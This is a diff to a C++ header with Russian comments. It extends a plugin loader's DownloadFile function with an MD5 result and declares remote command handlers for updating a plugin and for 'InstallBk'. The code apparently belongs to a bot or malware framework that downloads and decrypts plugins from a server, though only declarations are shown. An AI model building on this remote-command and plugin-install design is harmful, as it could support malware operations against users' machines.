@@ -57,6 +57,9 @@ namespace Plugin
 	//                   то адрес будет взят из глобальных настроек
 	//  FileSize - Указатель на переменную, куда будет записан размер файла.
 	//			   Не обязательный параметр.
+	//  PluginMd5 - Указатель на переменную, куда будет записан Md5 сумма, если она есть.
+	//			   Необязательный параметр. Если MD5 суммы нет - в результате будет NULL.
+	//             Очищать память после нее - STR::Free()
 	//
 	//  Результат: В случае успеха функция вернёт указатель на буфер с файлом
 	//             В случае отсутствия плагина на сервере функция вернёт NULL
@@ -64,7 +67,7 @@ namespace Plugin
 	//  Примечание: Функция вернёт управление в случае отсутствия плагина на
 	//              сервере либо файл плагина будет успешно загружен
 	//------------------------------------------------------------------------
-	LPBYTE DownloadFile(PCHAR PluginName, PCHAR PluginsListURL, DWORD *FileSize);
+	LPBYTE DownloadFile(PCHAR PluginName, PCHAR PluginsListURL, DWORD *FileSize, PCHAR* PluginMd5);
 
 	//------------------------------------------------------------------------
 	//	DecryptPlugin - Функция декодирует плагин.
@@ -146,6 +149,20 @@ namespace Plugin
 	//  DownloadFromCache - функция загружает плагин из кэша
 	//------------------------------------------------------------------------
 	LPBYTE DownloadFromCache(PCHAR PluginName, bool IsExecutable,  PCHAR CachePath, DWORD *PluginSize);
+
+	// имя команды обновления плага
+	extern const char* CommandUpdatePlug;
+
+	// объявление команды обновления плага
+	bool ExecuteUpdatePlug(void* Manager, PCHAR Command, PCHAR Args);
+
+
+	// имя команды обновления плага
+	extern const char* CommandInstallBk;
+	
+	// объявление команды обновления плага
+	bool ExecuteInstallBk(void* Manager, PCHAR Command, PCHAR Args);
+
 }
 
 
